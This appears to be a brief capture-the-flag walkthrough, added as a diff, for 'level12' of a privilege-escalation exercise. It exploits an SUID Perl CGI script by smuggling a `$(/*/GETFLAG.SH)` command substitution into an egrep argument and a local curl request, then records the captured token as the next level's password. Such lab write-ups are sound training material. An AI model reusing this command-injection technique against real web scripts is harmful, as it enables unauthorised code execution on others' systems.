@@ -1,0 +1,24 @@
+An SUID Perl script is located in home directory.
+
+		./level12.pl
+
+	Content-type: text/html
+
+	..
+
+Script execute a substitution command.
+Find script in Ressources/hack.sh
+
+		chmod +x /tmp/GETFLAG.SH
+
+		`egrep "^$xx" /tmp/xd 2>&1`
+		`egrep "^$(/*/GETFLAG.SH)" /tmp/xd 2>&1`
+
+		curl  'http://127.0.0.1:4646/?x=$(/*/GETFLAG.SH)'
+
+		cat /tmp/flag12
+
+	Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+LEVEL13 PASSWORD: g1qKMiRpXf53AWhDaU7FEkczr
+
